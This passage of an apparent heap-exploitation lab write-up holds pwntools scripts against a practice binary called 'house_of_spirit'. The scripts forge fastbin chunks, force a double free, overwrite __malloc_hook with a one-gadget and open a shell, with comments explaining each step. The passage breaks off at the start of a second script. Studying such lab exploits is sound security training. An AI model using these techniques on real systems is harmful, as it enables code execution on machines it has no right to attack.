+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>},</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>puts</span><span class=p>,</span> <span class=n>heap</span> <span class=o>=</span> <span class=n>handle</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#=====================================================================================</span>
+</span></span><span class=line><span class=cl><span class=c1># fastbin chunk</span>
+</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>age = 0x81
+</span></span></span><span class=line><span class=cl><span class=s1>username = p64(0)*3 + p64(0x20fff)
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>info_user(age, username)
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>name = b&#39;a&#39;*8 + p64(elf.sym[&#39;user&#39;] + 0x10)
+</span></span></span><span class=line><span class=cl><span class=s1>chunk_A = malloc(0x18, b&#39;X&#39;*0x18, name)
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>free(chunk_A)
+</span></span></span><span class=line><span class=cl><span class=s1>malloc(0x78, b&#39;Y&#39;*64 + b&#39;Much Win</span><span class=se>\x00</span><span class=s1>&#39;, &#39;Winner&#39;)
+</span></span></span><span class=line><span class=cl><span class=s1>target()
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#=====================================================================================</span>
+</span></span><span class=line><span class=cl><span class=c1>#largee chunk</span>
+</span></span><span class=line><span class=cl><span class=n>age</span> <span class=o>=</span> <span class=mh>0x91</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#only trigger bit prev_inused for third chunk</span>
+</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>5</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x11</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x01</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>info_user</span><span class=p>(</span><span class=n>age</span><span class=p>,</span> <span class=n>username</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>name</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;X&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Y&#39;</span><span class=o>*</span><span class=mi>64</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;Much Win</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;Winner&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>target</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>shell_with_heap_leak.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_spirit&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.30_no-tcache/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>b *main
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+270
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+327
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+415
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+541
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+652
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+707
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+792
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+873
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>handle</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>puts</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>heap</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;heap @ &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s1>&#39;puts @ &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;heap @ &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>puts</span><span class=p>,</span> <span class=n>heap</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info_user</span><span class=p>(</span><span class=n>age</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your age: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>age</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your username: &#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>chunk_name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;chunk name: &#39;</span><span class=p>,</span> <span class=n>chunk_name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>target</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>},</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>puts</span><span class=p>,</span> <span class=n>heap</span> <span class=o>=</span> <span class=n>handle</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>timeout</span> <span class=o>=</span> <span class=mf>0.1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#=====================================================================================</span>
+</span></span><span class=line><span class=cl><span class=c1># Ignore the &#34;age&#34; field.</span>
+</span></span><span class=line><span class=cl><span class=n>age</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=c1># Ignore the &#34;username&#34; field.</span>
+</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;Broder&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>info_user</span><span class=p>(</span><span class=n>age</span><span class=p>,</span> <span class=n>username</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Request two chunks with size 0x70.</span>
+</span></span><span class=line><span class=cl><span class=c1># The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) is used later as a size field.</span>
+</span></span><span class=line><span class=cl><span class=c1># The &#34;dup&#34; chunk will be duplicated, the &#34;safety&#34; chunk is used to bypass the fastbins double-free mitigation.</span>
+</span></span><span class=line><span class=cl><span class=n>dup</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>safety</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Request a 3rd &#34;spirit&#34; chunk of any size, leverage the stack overflow to overwrite the pointer to this chunk</span>
+</span></span><span class=line><span class=cl><span class=c1># with the address of the &#34;dup&#34; chunk.</span>
+</span></span><span class=line><span class=cl><span class=n>spirit</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;C&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;C&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Coerce a double-free by freeing the &#34;dup&#34; chunk, then the &#34;safety&#34; chunk, then the &#34;spirit&#34; chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># This way the &#34;dup&#34; chunk is not at the head of the 0x70 fastbin when it is freed for the second time,</span>
+</span></span><span class=line><span class=cl><span class=c1># bypassing the fastbins double-free mitigation.</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>safety</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>spirit</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request for a 0x70-sized chunk will be serviced by the &#34;dup&#34; chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># Request it, then overwrite its fastbin fd, pointing it to the fake chunk near the malloc hook,</span>
+</span></span><span class=line><span class=cl><span class=c1># specifically where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the</span>
+</span></span><span class=line><span class=cl><span class=c1># least-significant byte of the size field.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x23</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Make two more requests for 0x70-sized chunks. The &#34;safety&#34; chunk, then the &#34;dup&#34; chunk are allocated to</span>
+</span></span><span class=line><span class=cl><span class=c1># service these requests.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;D&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;D&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;E&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;E&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request for a 0x70-sized chunk is serviced by the fake chunk near the malloc hook.</span>
+</span></span><span class=line><span class=cl><span class=c1># Use it to overwrite the malloc hook with the address of a one-gadget.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;X&#39;</span><span class=o>*</span><span class=mh>0x13</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span> <span class=mh>0xe1fa1</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># [rsp+0x50] == NULL</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next call to malloc() will instead call the one-gadget and drop a shell.</span>
+</span></span><span class=line><span class=cl><span class=c1># The argument to malloc() is irrelevant, as long as it passes the program&#39;s size check.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>shell_no_heap_leak.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
